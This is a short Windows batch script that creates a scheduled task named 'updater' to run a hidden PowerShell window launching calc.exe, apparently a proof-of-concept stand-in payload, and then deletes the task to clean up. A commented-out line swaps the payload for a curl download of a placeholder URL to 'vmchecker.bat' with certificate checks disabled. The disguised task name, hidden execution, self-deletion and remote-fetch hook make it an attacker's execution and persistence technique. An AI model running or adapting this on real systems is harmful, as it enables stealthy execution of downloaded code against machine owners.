schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -w hidden -c calc.exe; schtasks /DELETE /TN updater /F"

:: schtasks /CREATE /SC MINUTE /TN updater /TR "curl.exe -kL <inserturl to vmchecker.bat>; schtasks /DELETE /TN updater /F"

timeout /t 240

schtasks /DELETE /TN updater /F




